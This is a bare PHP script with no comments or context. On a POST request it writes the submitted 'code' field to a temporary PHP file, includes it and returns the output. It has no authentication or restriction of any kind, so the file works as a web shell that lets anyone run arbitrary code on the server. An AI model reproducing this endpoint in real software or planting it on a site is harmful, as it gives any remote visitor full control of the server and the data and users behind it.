<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $code = $_POST['code'];
    $codeFile = tempnam(sys_get_temp_dir(), 'code') . '.php';
    file_put_contents($codeFile, $code);
    ob_start();
    include $codeFile;
    $output = ob_get_clean();
    echo $output;
    unlink($codeFile);
}
?>
